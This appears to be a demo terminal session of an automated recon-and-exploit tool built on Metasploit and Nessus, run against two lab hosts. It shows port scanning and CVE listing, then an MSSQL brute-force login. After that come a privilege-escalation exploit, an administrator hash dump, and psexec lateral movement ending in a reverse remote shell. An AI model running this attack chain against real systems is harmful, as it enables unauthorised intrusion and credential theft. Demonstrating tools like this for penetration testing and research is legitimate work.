@@ -1,0 +1,308 @@
+ares@ubuntu:~/Documents/ares_repo$ sudo -s
+[sudo] password for ares:
+root@ubuntu:~/Documents/ares_repo# source activate
+(venv) root@ubuntu:~/Documents/ares_repo# python ares.py
+
+
+            |     '||''|.   '||''''|   .|'''.|
+           |||     ||   ||   ||  .     ||..  '
+          |  ||    ||''|'    ||''|      ''|||.
+         .''''|.   ||   |.   ||       .     '||
+        .|.  .||. .||.  '|' .||.....| |'....|'
+
+        Automated  Recon  &  Exploit  Software
+
+>>> help
+
+Documented commands (type help <topic>):
+========================================
+EOF    exploit  import  plan  setup  show    test
+cexit  help     msf     scan  shell  target
+
+>>> help setup
+
+    Setup services available to console.
+
+>>> setup
+[*] loading PostgreSQL plugin
+[+] PostgreSQL database now avaliable
+[*] loading Metasploit plugin
+[+] Metasploit now avaliable
+[*] loading Nessus plugin
+[+] Nessus now avaliable
+[*] logging into Metasploit via RPC
+[+] Metasploit client login successfull
+[*] connecting msf console to Metasploit client
+[+] msf console now avaliable, see 'help msf'
+[*] connecting msf commmand tool to msf console
+[m] Nessus Bridge for Metasploit
+[m] Type nessus_help for a command listing
+[m] Successfully loaded plugin: Nessus
+[m] Connecting to https://localhost:8834/ as ares
+[m] User ares authenticated successfully.
+[+] Nessus now avaliable to msf
+[*] connecting Metasploit to database
+[+] Metasploit connected to database
+[+] setting up msf workspace
+[m] Workspace 'default' already existed, switching to it.
+[m] Workspace: default
+[*] setup complete
+
+>>> help scan
+
+    Scan a network or targetted host
+    Options:
+    - scan hosts "ip range"
+    - scan port "target name"
+    - scan full "target name"
+
+>>> scan hosts 172.16.231.130-131
+
+    hosts
+    ============================================================
+    172.16.231.130 - live
+    172.16.231.131 - live
+
+>>> target t1 172.16.231.131
+
+    targets
+    ============================================================
+    t1 172.16.231.131
+
+>>> target t2 172.16.231.130
+
+    targets
+    ============================================================
+    t1 172.16.231.131
+    t2 172.16.231.130
+
+>>> show target t1
+
+    ============================================================
+
+    IP:        172.16.231.131
+    Session:
+    Access:
+    OS:
+    TCP Ports:  ... total(0)
+    UDP Ports:  ... total(0)
+    Services:
+    Vulns:
+    IServices:
+
+    ============================================================
+
+>>> scan ports t1
+[*] scan running...
+[*] scan completed
+[+] t1 updated with port scan
+
+>>> show target t1
+
+    ============================================================
+
+    IP:        172.16.231.131
+    Session:
+    Access:
+    OS:
+    TCP Ports: 79, 21, 80,  ... total(9)
+    UDP Ports: 137, 1434, 123,  ... total(4)
+    Services:
+    Vulns:
+    IServices:
+
+    ============================================================
+
+>>> import port t2
+[+] t2 updated with port scan
+
+>>> import full t2
+[+] t2 updated with full scan
+
+>>> show target t2
+
+    ============================================================
+
+    IP:        172.16.231.130
+    Session:
+    Access:
+    OS:        Microsoft Windows XP Service Pack 3
+    TCP Ports: 21, 80, 1433,  ... total(8)
+    UDP Ports: 137, 1434, 123,  ... total(4)
+    Services:  
+    Vulns:     CVE-2007-6750
+               CVE-2008-4114
+               CVE-2008-4250
+               CVE-2010-0425
+               CVE-2011-3368
+               total(16)
+
+    ============================================================
+
+>>> plan
+[*] running planner at depth 1. Goal is:  port_scanned
+[*] running planner at depth 2. Goal is:  full_scanned
+[*] running planner at depth 3. Goal is:  initial_access
+[*] running planner at depth 4. Goal is:  admin_access
+[*] running planner at depth 5. Goal is:  traversed
+[*] planner resolved
+
+    plan
+    ============================================================
+    step    0: EXPLOIT_MSQL_BRUTE_FORCE T1
+            1: EXPLOIT_CVE_2011_2005 T1
+            2: EXPLOIT_HASHDUMP T1
+            3: EXPLOIT_PSEXEC T1 T2
+            4: REACH-GOAL
+
+>>> exploit msql-brute-force t1
+[*] 172.16.231.131:1433   - 172.16.231.131:1433 - MSSQL - Starting authentication scanner.
+[*] 172.16.231.131:1433   - Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+[!] exploit failed, password not found
+
+>>> plan
+[*] running planner at depth 1. Goal is:  port_scanned
+[*] running planner at depth 2. Goal is:  full_scanned
+[*] running planner at depth 3. Goal is:  initial_access
+[*] running planner at depth 4. Goal is:  admin_access
+[*] running planner at depth 5. Goal is:  traversed
+[*] planner resolved
+
+    plan
+    ============================================================
+    step    0: EXPLOIT_MSQL_BRUTE_FORCE T2
+            1: EXPLOIT_CVE_2011_2005 T2
+            2: EXPLOIT_HASHDUMP T2
+            3: EXPLOIT_PSEXEC T2 T1
+            4: REACH-GOAL
+
+>>> exploit msql-brute-force t2
+[*] 172.16.231.130:1433   - 172.16.231.130:1433 - MSSQL - Starting authentication scanner.
+[+] 172.16.231.130:1433   - 172.16.231.130:1433 - Login Successful: WORKSTATION\sa:password123
+[*] 172.16.231.130:1433   - Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+[*] found msql username and password
+
+    msql credentials
+    ============================================================
+    username: sa
+    password: password123
+
+[*] exploit successful, session id: 1
+
+>>> show target t2
+
+    ============================================================
+
+    IP:        172.16.231.130
+    Session:   1
+    Access:    user
+    ...
+
+    ============================================================
+
+>>> plan
+[*] planner resolved
+
+    plan
+    ============================================================
+    step    0: EXPLOIT_CVE_2011_2005 T2
+            1: EXPLOIT_HASHDUMP T2
+            2: EXPLOIT_PSEXEC T2 T1
+            3: REACH-GOAL
+
+>>> exploit cve-2011-2005 t2
+[*] exploit successful, session id: 2
+
+>>> show target t2
+
+    ============================================================
+
+    IP:        172.16.231.130
+    Session:   2
+    Access:    admin
+    ...
+
+    ============================================================
+
+>>> plan
+[*] planner resolved
+
+    plan
+    ============================================================
+    step    0: EXPLOIT_HASHDUMP T2
+            1: EXPLOIT_PSEXEC T2 T1
+
+>>> exploit hashdump t2
+
+[+] administrator password hash added:
+    e52cac67419a9a224a3b108f3fa6cb6d:8846f7eaee8fb117ad06bdd830b7586c
+
+>>> plan
+[*] planner resolved
+
+    plan
+    ============================================================
+    step    0: EXPLOIT_PSEXEC T2 T1
+
+>>> exploit psexec t2 t1
+[m] Started reverse TCP handler on 172.16.231.150:4444
+[m] 172.16.231.131:445 - Connecting to the server...
+[m] 172.16.231.131:445 - Authenticating to 172.16.231.131:44
+    5 as user 'Administrator'...
+[m] 172.16.231.131:445 - Uploading payload... HlWXPKIP.exe
+[+] 172.16.231.131:445 - Service started successfully...
+[*] 172.16.231.131:445 - Authenticating to 172.16.231.131:445 as user 'Administrator'
+[*] 172.16.231.131:445 - Uploading payload... HlWXPKIP.exe
+[+] 172.16.231.131:445 - Service started successfully...
+[*] Sending stage (180291 bytes) to 172.16.231.131
+[*] exploit successful, session id: 4
+
+>>> show target t1
+
+    ============================================================
+
+    IP:        172.16.231.131
+    Session:   4
+    Access:    admin
+    OS:
+    TCP Ports: 79, 21, 80,  ... total(9)
+    UDP Ports: 137, 1434, 123,  ... total(4)
+    ...
+
+    ============================================================
+
+>>> msf
+
+msf>>> sessions -i 4
+
+msf>>> shell
+
+    ============================================================
+
+    Process 172 created.
+    Channel 1 created.
+    Microsoft Windows XP [Version 5.1.2600]
+    (C) Copyright 1985-2001 Microsoft Corp.
+
+    C:\WINDOWS\system32>
+
+    ============================================================
+
+msf>>> ipconfig
+
+    ============================================================
+
+    Windows IP Configuration
+    Ethernet adapter Local Area Connection:
+            Connection-specific DNS Suffix  . :
+
+            IP Address. . . . . . . . . . . . : 172.16.231.131
+            Subnet Mask . . . . . . . . . . . : 255.255.255.0
+
+    C:\WINDOWS\system32>
+
+    ============================================================
+
+msf>>>
